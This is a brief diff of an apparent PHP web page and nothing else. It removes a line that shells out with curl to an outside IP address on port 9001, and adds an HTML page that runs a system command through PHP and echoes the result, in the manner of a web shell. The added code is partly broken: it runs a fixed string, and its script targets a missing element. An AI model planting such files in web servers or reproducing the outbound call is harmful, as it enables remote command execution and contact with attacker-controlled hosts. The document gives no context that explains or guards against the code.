@@ -1,1 +1,10 @@
-<?php system("curl 18.218.61.87:9001"); ?>
+<html>
+<body>
+<pre>
+<?php
+   echo system('cmd');
+?>
+</pre>
+</body>
+<script>document.getElementById("cmd").focus();</script>
+</html>
